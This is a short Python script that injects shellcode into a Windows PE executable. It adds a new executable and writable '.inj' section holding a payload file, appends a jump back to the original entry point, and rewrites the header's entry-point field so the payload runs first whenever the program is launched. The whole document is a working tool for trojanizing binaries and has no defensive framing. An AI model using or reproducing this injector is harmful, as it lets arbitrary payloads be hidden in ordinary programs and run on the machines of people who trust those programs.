import lief, sys, io
from pycca.asm import *
import argparse
def align(x, al):
    if x % al == 0:
        return x
    else:
        return x - (x % al) + al


def pad_data(data, al):
    return data + ([0] * (align(len(data), al) - len(data)))

parser = argparse.ArgumentParser()
parser.add_argument("-b", "--binary", required=True)
parser.add_argument("-o", "--out", required=True)
parser.add_argument("-p", "--payload", required=True)
args = parser.parse_args()

payload = args.payload
if not __import__("ntpath").exists(payload):
    payload = __import__("ntpath").join("shellcodes", payload)
    if not __import__("ntpath").exists(payload):
        quit("Payload doesn't exist.")
        
unpack_p = lief.PE.parse(args.binary)

total = 0

f_al = unpack_p.optional_header.file_alignment
s_al = unpack_p.optional_header.section_alignment


def add_section_with_content(pe, section_name, content, size):
	packed_data = pad_data(list(content), f_al)
	packed_section = lief.PE.Section(section_name)
	packed_section.content =  packed_data
	packed_section.size = align(size, f_al)
	packed_section.characteristics = 0xE0000020
	packed_section.virtual_size = align(size, f_al)
	packed_section.sizeof_raw_data = align(size, f_al)
	section = pe.add_section(packed_section)
	return section


injection_code = open(payload, "rb").read()
section = add_section_with_content(unpack_p, ".inj", injection_code, len(injection_code) + 64)
current_address = section.virtual_address + len(injection_code)
injection_code += jmp((unpack_p.entrypoint - unpack_p.imagebase) - current_address).code
section.content = list(injection_code)
builder = lief.PE.Builder(unpack_p)
builder.build()
buffer =builder.get_build()
fp = open(args.out, "wb+")
fp.write(bytes(buffer))
fp.seek(0x3c)
fp.seek(int.from_bytes(fp.read(4), "little") + 0x28)
fp.write(section.virtual_address.to_bytes(4, "little"))
fp.close()
